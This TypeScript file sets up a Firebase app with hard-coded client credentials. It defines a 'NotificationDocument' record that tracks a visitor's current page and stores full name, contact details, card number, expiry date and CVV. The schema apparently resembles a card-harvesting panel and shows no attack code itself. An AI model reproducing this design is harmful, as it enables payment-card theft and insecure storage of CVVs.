import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyDCu8i9M9xoXN1h2Td7obeUfMaJJwav5Vk",
  authDomain: "zainqpp-e796a.firebaseapp.com",
  projectId: "zainqpp-e796a",
  storageBucket: "zainqpp-e796a.firebasestorage.app",
  messagingSenderId: "180234424004",
  appId: "1:180234424004:web:01c54f114f52da940bc391",
  measurementId: "G-W2844M2JHS"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

